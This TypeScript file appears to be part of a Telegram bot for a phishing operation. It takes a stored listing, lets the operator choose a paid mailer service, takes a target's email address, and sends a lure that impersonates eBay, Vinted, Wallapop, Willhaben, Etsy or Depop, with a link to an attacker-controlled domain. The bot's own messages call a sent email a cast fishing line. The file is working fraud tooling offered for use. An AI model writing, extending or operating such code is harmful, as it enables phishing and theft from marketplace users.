import {Context} from "@/database/models/context";
import {Scene} from "grammy-scenes";
import {Composer, InlineKeyboard} from "grammy";
import {adsRepository, domensRepository} from "@/database";
import {deleteAllMessages} from "@/helpers/deleteAllMessages";
import {
    preSendEmailDepa, preSendEmailGOSU, preSendEmailPhs,
    sendEmailAnafema,
    sendEmailDepa,
    sendEmailKeshMail,
    sendEmailYourMailer
} from "@/utils/rassilka/email";
import {getDomen} from "@/helpers/getDomen";
import console from "console";

export const scene = new Scene<Context>('emailSend')
export const composer = new Composer<Context>()
const regex = /email ad (?<id>\d+)/gmi
composer.callbackQuery(regex, handler)

async function handler(ctx: Context)  {
    const match = regex.exec(ctx.callbackQuery.data)
    const id = match.groups.id
    await ctx.scenes.enter('emailSend', {
        id
    })
}

async function cancel(ctx) {
    await deleteAllMessages(ctx.session.deleteMessage, ctx)
    ctx.scene.exit()
}

scene.always().callbackQuery('cancel emailSend', cancel)

scene.do(async (ctx) => {
    ctx.session.smsEmail = {ad: Number(ctx.scene.opts.arg.id), to: undefined, pattern: undefined}
    const ad = await adsRepository.findOne({
        where: {
            id: ctx.session.smsEmail.ad
        }
    })
    if (!ad) {
        await ctx.reply(`ad undefined`, {
            reply_markup: {
                inline_keyboard: [
                    [{text: 'Закрыть', callback_data: 'deleteThisMessage'}]
                ]
            }
        })
        return cancel(ctx)
    }
    const reply_markup = new InlineKeyboard()

    if (ad.service === 'willhaben'
    || ad.service === 'wallapop'
        || ad.service === 'vinted') {
        reply_markup.text('YourMailer | 5%', 'yourmailer')
    } else if(ad.service === 'etsy') {
        reply_markup.text('PHS | 5%', 'phs')
        reply_markup.row()
        reply_markup.text('GOSU | 5%', 'gosu')
    } else {
        reply_markup.text('PHS | 5%', 'phs')
        reply_markup.row()
        reply_markup.text('GOSU | 5%', 'gosu')
        reply_markup.row()
        reply_markup.text('YourMailer | 5%', 'yourmailer')
        reply_markup.row()
        reply_markup.text('Отмена', 'cancel emailSend')
    }
    const msg = await ctx.reply("<b>Выбери мейлера:</b>", {
        reply_markup
    })

    ctx.session.deleteMessage = [msg.message_id]
    ctx.scene.resume()
})

scene.wait().callbackQuery(/keshmail|yourmailer|anafema|phs|gosu/,async (ctx) => {
    ctx.session.smsEmail.who = ctx.callbackQuery.data
    try {
        ctx.deleteMessage()
    } catch (e) {}

    if (ctx.callbackQuery.data === 'depa') {
        if (ctx.user.email <= 0) {
            return ctx.answerCallbackQuery({
                show_alert: true,
                text: `🐨 [DEPA] У тебя доступно 0 сообщений`
            })
        }
    }

    const ad = await adsRepository.findOne({
        where: {
            id: ctx.session.smsEmail.ad
        }
    })
    if (!ad) {
        await ctx.reply(`ad undefined`, {
            reply_markup: {
                inline_keyboard: [
                    [{text: 'Закрыть', callback_data: 'deleteThisMessage'}]
                ]
            }
        })
        return cancel(ctx)
    }

    if (ad.service.toLowerCase() === 'depop' && ctx.session.smsEmail.who === 'keshmail') {
        await ctx.reply(`keshmail сейчас недоступен для depop(`, {
            reply_markup: {
                inline_keyboard: [
                    [{text: 'Закрыть', callback_data: 'deleteThisMessage'}]
                ]
            }
        })
        return cancel(ctx)
    }

    const msg = await ctx.reply("<b>📨 Введи e-mail:</b>", {
        reply_markup:  new InlineKeyboard()
            .text('Отмена', 'cancel emailSend')
    })
    ctx.session.deleteMessage = []
    ctx.session.deleteMessage.push(msg.message_id)
    ctx.scene.resume()
})


scene.wait().on('message:text', async ctx => {
    ctx.session.smsEmail.to = ctx.msg.text
    ctx.session.deleteMessage.push(ctx.msg.message_id)

    const ad = await adsRepository.findOne({
        where: {
            id: ctx.session.smsEmail.ad
        }
    })
    if (!ad) {
        await ctx.reply(`ad undefined`, {
            reply_markup: {
                inline_keyboard: [
                    [{text: 'Закрыть', callback_data: 'deleteThisMessage'}]
                ]
            }
        })
        return cancel(ctx)
    }

    ad.email = ctx.session.smsEmail.to
    adsRepository.save(ad)
    if (ad.service.toLowerCase() === 'ebay' && ad.country.toLowerCase() === 'de') ctx.session.smsEmail.pattern = "ebay_DE@!!@eu"

    if (ad.service.toLowerCase() === 'vinted' && ad.country.toLowerCase() === 'es') ctx.session.smsEmail.pattern = "vinted_ES@!!@2.0"
    if (ad.service.toLowerCase() === 'vinted' && ad.country.toLowerCase() === 'de') ctx.session.smsEmail.pattern = "vinted_DE@!!@2.0"
    if (ad.service.toLowerCase() === 'vinted' && ad.country.toLowerCase() === 'pt') ctx.session.smsEmail.pattern = "vinted_PT@!!@2.0"
    if (ad.service.toLowerCase() === 'vinted' && ad.country.toLowerCase() === 'at') ctx.session.smsEmail.pattern = "vinted_AT@!!@2.0"

    if (ad.service.toLowerCase() === 'wallapop' && ad.country.toLowerCase() === 'es') ctx.session.smsEmail.pattern = "wallapop_ES@!!@2.0"
    if (ad.service.toLowerCase() === 'wallapop' && ad.country.toLowerCase() === 'pt') ctx.session.smsEmail.pattern = "wallapop_PT@!!@2.0"

    if (ad.service.toLowerCase() === 'willhaben' && ad.country.toLowerCase() === 'at') {
        return ctx.answerCallbackQuery({
            show_alert: true,
            text: '🇦🇹 VINTED AT - недоступен в yourmailer'
        })
    }

    let domen = undefined
    if (Number(ctx.user.tgId) === 5685044944
    || Number(ctx.user.tgId) === 5711319423) {
        domen = await domensRepository.findOne({
            where: {
                service: ad.service.toLowerCase(),
                special: true
            }
        })
    }
    if (!domen) domen = await getDomen(ctx.user,ad.service)

    if (!domen) {
        await ctx.reply(`domen undefined`, {
            reply_markup: {
                inline_keyboard: [
                    [{text: 'Закрыть', callback_data: 'deleteThisMessage'}]
                ]
            }
        })
        return cancel(ctx)
    }
    const msg = await ctx.reply(`⏳`)
    if (ctx.session.smsEmail.who === 'yourmailer') {
        const response = await sendEmailYourMailer(
            ctx.session.smsEmail.to,
            ctx.session.smsEmail.pattern,
            `https://${domen.link}/link/${ad.link}/yourmailer`,
            ctx.from.id)
        try {
            ctx.api.deleteMessage(ctx.chat.id,msg.message_id)
        } catch (e) {}

        console.log(response, 'yourmailer')
        await ctx.reply(
            (response === "The message has been sent")
                ? `✅ Кис-кис, я котик ты котик &lt;3`
                : `⚠️ Не удалось отправить письмо`,
            {
                reply_markup: {
                    inline_keyboard: [
                        [{text: 'Закрыть', callback_data: 'deleteThisMessage'}]
                    ]
                }
            })
    } else if (ctx.session.smsEmail.who === 'keshmail') {
        let service = undefined
        if (ad.service.toLowerCase() === 'ebay' && ad.country.toLowerCase() === 'de') service = "ebay.de"

        const response = await sendEmailKeshMail(
            String(ctx.from.id),
            String( (ctx.from?.username) ? ctx.from?.username : 'none'),
            ctx.session.smsEmail.to,
            `https://${domen.link}/link/${ad.link}?email=${ctx.session.smsEmail.to}&emailowner=${ctx.session.smsEmail.who}`,
            service,
            ad.date)
        try {
            ctx.api.deleteMessage(ctx.chat.id,msg.message_id)
        } catch (e) {}
        console.log(response, 'keshmail')
        await ctx.reply(
            (response)
                ? `✅ Удочка закинута`
                : `⚠️ Не удалось отправить письмо`,
            {
                reply_markup: {
                    inline_keyboard: [
                        [{text: 'Закрыть', callback_data: 'deleteThisMessage'}]
                    ]
                }
            })
    }  else if (ctx.session.smsEmail.who === 'anafema') {
        let service = undefined
        if (ad.service.toLowerCase() === 'ebay' && ad.country.toLowerCase() === 'de') service = 58

        if (ad.service.toLowerCase() === 'vinted' && ad.country.toLowerCase() === 'es') service = 6
        if (ad.service.toLowerCase() === 'vinted' && ad.country.toLowerCase() === 'de') service = 4
        if (ad.service.toLowerCase() === 'vinted' && ad.country.toLowerCase() === 'pt') service = 12
        if (ad.service.toLowerCase() === 'vinted' && ad.country.toLowerCase() === 'at') {
            return ctx.answerCallbackQuery({
                show_alert: true,
                text: '🇦🇹 VINTED AT - недоступен в anafema'
            })
        }

        if (ad.service.toLowerCase() === 'wallapop' && ad.country.toLowerCase() === 'es') service = 14
        if (ad.service.toLowerCase() === 'wallapop' && ad.country.toLowerCase() === 'pt') service = 85
        if (ad.service.toLowerCase() === 'willhaben' && ad.country.toLowerCase() === 'at') {
            return ctx.answerCallbackQuery({
                show_alert: true,
                text: '🇦🇹 WILLHABEN AT - недоступен в anafema'
            })
        }

        const response = await sendEmailAnafema(
            String(ctx.from.id),
            String( (ctx.from?.username) ? ctx.from?.username : 'none'),
            ctx.session.smsEmail.to,
            `https://${domen.link}/link/${ad.link}/anafema`,
            service,
            ad.date)
        try {
            ctx.api.deleteMessage(ctx.chat.id,msg.message_id)
        } catch (e) {}
        console.log(response, 'anafema')
        await ctx.reply(
            (response)
                ? `✅ Кис-кис, я котик ты котик &lt;3`
                : `⚠️ Не удалось отправить письмо`,
            {
                reply_markup: {
                    inline_keyboard: [
                        [{text: 'Закрыть', callback_data: 'deleteThisMessage'}]
                    ]
                }
            })
    } else if (ctx.session.smsEmail.who === 'depa') {
        await preSendEmailDepa(ctx,ad,domen,msg,ad.service)
    } else if (ctx.session.smsEmail.who === 'phs') {
        await preSendEmailPhs(ctx,ad,domen,msg,ad.service,String( (ctx.from?.username) ? ctx.from?.username : 'none'))
    }else if (ctx.session.smsEmail.who === 'gosu') {
        await preSendEmailGOSU(ctx,ad,domen,msg,ad.service,ad.country,String( (ctx.from?.username) ? ctx.from?.username : 'none'))
    }


    return cancel(ctx)
})